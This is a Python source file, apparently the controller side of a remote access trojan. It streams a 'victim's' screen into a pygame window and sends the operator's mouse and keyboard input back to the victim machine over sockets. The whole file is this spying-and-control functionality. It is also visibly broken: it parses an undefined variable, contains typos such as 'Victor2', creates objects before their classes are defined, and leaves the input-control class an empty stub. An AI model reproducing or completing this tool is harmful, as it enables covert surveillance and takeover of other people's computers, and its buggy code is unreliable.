"""
Functions for viewing victim's screen and controlling input
"""

import threading
import pygame
#from pygame.locals import * # included in consts
# import my stuff
import utils
from consts import * # includes * from pygame.locals

# global thread handles
videoRecvHandle = videoRecvThread()
videoRenderHandle = videoRenderThread()
inputControlHandle = inputControlContext()

"""
Class to receive video data - does nothing to render video
Will constantly receive newest frame from victim, 
	regardless of whether or not last frame has been read/rendered
TODO - might it be better for this class to draw all new images to pygame surface
	surface would then get passed to video render thread to draw?
"""
class videoRecvThread(threading.Thread):
	def __init__(self):
		super().__init__(self, daemon=True)
		self.running = False
		self.videoSock = None
		self.comp = pygame.Surface((0, 0)) # composite of all received frames
		self.imgDirty = False # dirty bit
		self.imgLock = threading.Lock() # lock for image buffer

	# enable video stream and connect to victim
	def sendStartSignal(self, mainSock):
		mainSock.sendAll(bytes([START_VIDEO, 0]))
		self.videoSock = utils.openConnection(VIDEO_PORT)

	# close the video stream connection and stop the thread
	def sendStopSignal(self, mainSock):
		self.running = False
		mainSock.sendAll(bytes([END_VIDEO, 0]))
		self.videoSock.close()
	
	# getter function for image size
	def getImgSize(self):
		return self.comp.get_size()

	# getter function for lock
	def getLock(self):
		return self.imgLock

	# getter function for comp
	def getImg(self):
		return self.comp

	# getter function for dirty bit
	def getDirty(self):
		return self.imgDirty

	# reset dirty bit to False
	def resetDirty(self):
		self.imgDirty = False

	def run(self):
		# main loop
		while self.running:
			# get frame header - 'big endian' is network byte order
			buffer = self.videoSock.recv(12)
			screenWidth = int.from_bytes(data[0:4], byteorder='big', signed=True) # TODO
			screenHeight = int.from_bytes(data[4:8], byteorder='big', signed=True) # TODO
			screenSize = pygame.Vector2(screenWidth, screenHeight)
			origX = 0 # TODO
			origY = 0 # TODO
			imgOrig = pygame.Victor2(origX, origY)
			imgWidth = int.from_bytes(data[0:4], byteorder='big', signed=True)
			imgHeight = int.from_bytes(data[4:8], byteorder='big', signed=True)
			imgSize = pygame.Vector2(imgWidth, imgHeight)
			fileSize = int.from_bytes(data[8:12], byteorder='big', signed=True)
			# get RGB data
			buffer = b''
			while len(buffer) != fileSize:
				temp = self.videoSock.recv(fileSize - len(buffer))
				# find better way to shutdown when connection lost
				if not temp:
					print('Video connection closed!')
					return
				buffer += temp
			# create the received image so we can draw it
			img = pygame.image.frombuffer(buffer, imgSize, 'ARGB')
			# acquire the image lock before messing with comp
			self.imgLock.acquire() # threading.Lock.acquire() blocks by default
			# check if we need to resize the composite surface
			compSize = pygame.Vector2(self.comp.get_size())
			if compSize != screenSize:
				self.comp = pygame.Surface(screenSize)
			# draw the image
			self.comp.blit(img, imgOrig)
			# set the dirty bit
			self.imgDirty = True
			# release the lock
			self.imgLock.release()

"""
Class to render video using pygame
Will automatically start/stop the video recv thread
Any inputs NOT meant to affect video will be sent to input control context
"""
class videoRenderThread(threading.Thread):
	def __init__(self):
		super().__init__(self, daemon=True)
		self.running = False

	def stop(self):
		self.running = False

	def run(self):
		# set running to true
		self.running = True
		# initialize pygame and create the window and a resizable surface to draw on
		pygame.init()
		pygame.display.set_caption("CC")
		screen = pygame.display.set_mode((768,432), pygame.RESIZABLE)
		# block certain events from the pygame event queue
		pygame.event.set_blocked(pygame.MOUSEMOTION)
		# create a clock to use for limiting the frame rate
		clock = pygame.time.Clock()

		# image and dirty bit info
		img = pygame.Surface((0, 0))
		baseSize = None
		scaledSize = None
		blitPos = None
		rescale = False
		redraw = False
		# vars for pan and zoom
		offset = pygame.Vector2(0, 0)
		zoom = 1.0
		# amount to change pan and zoom by
		panStep = 20
		zoomStep = 0.1

		# main loop
		while self.running:
			# check if we need to update
			if videoRecvHandle.getDirty() or rescale:
				videoRecvHandle.getLock().acquire()
				baseSize = pygame.Vector2(videoRecvHandle.getImgSize())
				scaledSize = baseSize * zoom
				# if img size is the same as scaled size, pass it as the dest surface for speed
				if img.get_size() == scaledSize:
					pygame.transform.smoothscale(videoRecvHandle.getImg(), scaledSize, img)
				else: 
					img = pygame.transform.smoothscale(videoRecvHandle.getImg(), scaledSize)
				# cleanup/reset after getting the frame
				videoRecvHandle.resetDirty()
				videoRecvHandle.getLock().release()
				rescale = False
				redraw = True
			# update the screen
			if redraw:
				screen.fill((0, 0, 0))
				windowSize = pygame.Vector2(pygame.display.get_window_size())
				blitPos = (windowSize - scaledSize) // 2 # center the image
				blitPos += offset * zoom # apply the x/y offset, scaled for the zoom level
				screen.blit(img, blitPos)
				pygame.display.flip()
				redraw = False
			# send mouse pos if mouse is being controlled
			if inputControlHandle.mouseControlled():
				mousePos = pygame.Vector2(pygame.mouse.get_pos())
				# mousePos = distance from origin / surface size * 'real' image size
				mousePos = (mousePos - blitPos) / scaledSize * baseSize
				# bounds checking
				if mousePos.x < 0:
					mousePos.x = 0
				elif mousePos.x > baseSize.x:
					mousePos.x = baseSize.x
				if mousePos.y < 0:
					mousePos.y = 0
				elif mousePos.y > baseSize.y:
					mousePos.y = baseSize.y
				# convert position from pixelsto absolute
				# ref: https://stackoverflow.com/questions/7492529/how-to-simulate-a-mouse-movement
				mousePos = mousePos * 0xFFFF / baseSize + 1
				# send the input
				inputControlHandle.sendMousePos(mousePos)
			# go through event queue
			for event in pygame.event.get():
				# if window closed
				if event.type == pygame.QUIT:
					self.running = False
				# if a key is pressed while right control is held down
				elif event.type == pygame.KEYDOWN and event.mod & pygame.KMOD_RCTRL:
					if event.key == pygame.K_UP: # move up - push image down - increase y
						offset.y += panStep * zoom
						redraw = True
					elif event.key == pygame.K_DOWN:
						offset.y -= panStep * zoom
						redraw = True
					elif event.key == pygame.K_LEFT: # move left - push image right - increase x
						offset.x += panStep * zoom
						redraw = True
					elif event.key == pygame.K_RIGHT:
						offset.y -= panStep * zoom
						redraw = True
					elif event.key == pygame.K_KP_PLUS or event.key == pygame.K_PLUS: # zoom in
						zoom += zoomStep # zoom is done linearly - 100%, 110%, 120%, 130%, etc
						rescale = True
					elif event.key == pygame.K_KP_MINUS or event.key == pygame.K_MINUS:
						zoom -= zoomStep
						rescale = True
					elif event.key == pygame.K_c or event.key == pygame.K_r: # center the image and possibly reset the zoom
						offset.xy = 0, 0
						redraw = True
						if event.key == pygame.K_r: # also reset the zoom
							zoom = 1.0
							rescale = True
				# if keyboard is being controlled
				elif inputControlHandle.keyboardControlled():
					# if key down and right control not held
					if event.type == pygame.KEYDOWN and not event.mod & pygame.KMOD_RCTRL:
						inputControlHandle.sendKeyDown(event.key)
					# if key up and right control not held
					elif event.type == pygame.KEYUP and not event.mod & pygame.KMOD_RCTRL:
						inputControlHandle.sendKeyUp(event.key)
				# if mouse is being controlled
				elif inputControlhandle.mouseControlled():
					if event.type == pygame.MOUSEWHEEL:
						inputControlHandle.sendMouseScroll(event.y)
					elif event.type == pygame.MOUSEBUTTONDOWN:
						inputControlHandle.sendMouseDown(event.button)
					elif event.type == pygame.MOUSEBUTTONUP:
						inputControlHandle.sendMouseUp(event.button)
			# end event loop
			# limit framereate to 60 fps
			clock.tick(60)
		# stop the pygame instance
		pygame.quit()

class inputControlContext():
	def __init__(self):
		pass